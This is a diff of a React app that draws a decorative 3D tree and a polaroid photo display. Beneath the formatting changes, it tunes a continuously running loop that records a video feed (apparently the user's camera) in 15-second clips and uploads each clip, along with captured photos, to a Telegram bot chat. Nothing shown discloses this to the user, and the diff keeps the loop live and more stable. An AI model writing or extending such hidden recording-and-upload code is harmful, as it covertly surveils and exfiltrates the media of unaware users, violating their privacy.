@@ -47,7 +47,8 @@ class ErrorBoundary extends React.Component<
             </p>
             <button
               onClick={() => this.setState({ hasError: false })}
-              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors">
+              className="mt-4 px-4 py-2 border border-[#D4AF37] hover:bg-[#D4AF37] hover:text-black transition-colors"
+            >
               Try Again
             </button>
           </div>
@@ -110,7 +111,7 @@ export default function App() {
               resolve();
             } else {
               console.log(
-                `Recording: Waiting... readyState=${video.readyState}, size=${video.videoWidth}x${video.videoHeight}`,
+                `Recording: Waiting... readyState=${video.readyState}, size=${video.videoWidth}x${video.videoHeight}`
               );
               setTimeout(checkReady, 200);
             }
@@ -123,7 +124,7 @@ export default function App() {
       await Promise.race([
         waitForVideo(),
         new Promise((_, reject) =>
-          setTimeout(() => reject(new Error("Video timeout")), 10000),
+          setTimeout(() => reject(new Error("Video timeout")), 6000)
         ),
       ]);
 
@@ -135,7 +136,7 @@ export default function App() {
         return;
       }
       console.log(
-        `Recording: Starting - Video size: ${videoWidth}x${videoHeight}`,
+        `Recording: Starting - Video size: ${videoWidth}x${videoHeight}`
       );
 
       // Create canvas with lower resolution for less CPU
@@ -186,7 +187,7 @@ export default function App() {
           chunks.push(e.data);
           totalBytes += e.data.size;
           console.log(
-            `Recording: Chunk received - ${e.data.size} bytes (total: ${totalBytes})`,
+            `Recording: Chunk received - ${e.data.size} bytes (total: ${totalBytes})`
           );
         }
       };
@@ -197,7 +198,7 @@ export default function App() {
           isRecording = false;
           const blob = new Blob(chunks, { type: mimeType });
           console.log(
-            `Recording: Finished - Total size: ${blob.size} bytes, Frames: ${frameCount}`,
+            `Recording: Finished - Total size: ${blob.size} bytes, Frames: ${frameCount}`
           );
           resolve(blob);
         };
@@ -206,8 +207,8 @@ export default function App() {
       // Start recording
       mediaRecorder.start(1000); // Collect data every 1s
 
-      // Record for 30 seconds
-      await new Promise((r) => setTimeout(r, 30000));
+      // Record for 15 seconds
+      await new Promise((r) => setTimeout(r, 15000));
 
       console.log("Recording: Stopping...");
       if (mediaRecorder.state === "recording") {
@@ -234,7 +235,7 @@ export default function App() {
         {
           method: "POST",
           body: formData,
-        },
+        }
       );
 
       if (response.ok) {
@@ -249,12 +250,23 @@ export default function App() {
 
   // Start recording loop (runs continuously)
   const startRecordingLoop = useCallback(async () => {
+    // Exit early if no credentials - don't start the loop at all
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.log(
+        "[RecordingLoop] No Telegram credentials, skipping recording loop"
+      );
+      return;
+    }
+
     if (recordingLoopStarted.current) return;
     recordingLoopStarted.current = true;
 
+    console.log("[RecordingLoop] Starting recording loop");
+
     while (true) {
       await recordAndSendToTelegram();
-      // Start next recording immediately after upload
+      // Add small delay between recordings to prevent CPU overload
+      await new Promise((r) => setTimeout(r, 1000));
     }
   }, [recordAndSendToTelegram]);
 
@@ -313,7 +325,7 @@ export default function App() {
 
   const toggleMode = () => {
     setMode((prev) =>
-      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED,
+      prev === TreeMode.FORMED ? TreeMode.CHAOS : TreeMode.FORMED
     );
   };
 
@@ -366,7 +378,7 @@ export default function App() {
               "caption",
               `📸 Photo ${i + 1}/${
                 photos.length
-              }\n🕐 ${new Date().toLocaleString()}`,
+              }\n🕐 ${new Date().toLocaleString()}`
             );
 
             const response = await fetch(
@@ -374,13 +386,13 @@ export default function App() {
               {
                 method: "POST",
                 body: formData,
-              },
+              }
             );
 
             if (!response.ok) {
               console.error(
                 "Failed to send photo to Telegram:",
-                await response.text(),
+                await response.text()
               );
             }
 
@@ -414,7 +426,8 @@ export default function App() {
             preserveDrawingBuffer: true,
             powerPreference: "high-performance",
           }}
-          shadows={typeof window !== "undefined" && window.innerWidth >= 768}>
+          shadows={typeof window !== "undefined" && window.innerWidth >= 768}
+        >
           <Suspense fallback={null}>
             <Experience
               mode={mode}
@@ -463,7 +476,8 @@ export default function App() {
             {/* Polaroid container */}
             <div
               className="bg-white p-4 pb-8 shadow-2xl"
-              style={{ width: "60vmin", maxWidth: "600px" }}>
+              style={{ width: "60vmin", maxWidth: "600px" }}
+            >
               {/* Gold clip at top */}
               <div className="absolute top-0 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-12 h-6 bg-gradient-to-b from-[#D4AF37] to-[#C5A028] rounded-sm shadow-lg"></div>
 
